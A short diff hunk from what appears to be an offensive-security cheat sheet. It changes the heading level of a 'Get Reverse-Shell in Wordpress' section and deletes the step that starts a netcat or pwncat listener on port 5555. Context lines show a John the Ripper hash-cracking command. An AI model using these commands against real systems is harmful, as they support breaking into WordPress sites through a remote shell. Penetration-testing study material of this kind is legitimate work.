@@ -359,12 +359,8 @@ example 2.
 <b>pform@attacker~: </b><code>john hash-file.txt</code>
 
 
-<h2>Get Reverse-Shell in Wordpress</h2>
+<h1>Get Reverse-Shell in Wordpress</h1>
 
-
-First you need so set up your listner:
-
-<b>pform@attacker~: </b><code>nc -lnvp 5555</code> or <code>pwncat -lp 5555</code>
 
 Wordpress example 1. - Using 404.php
 
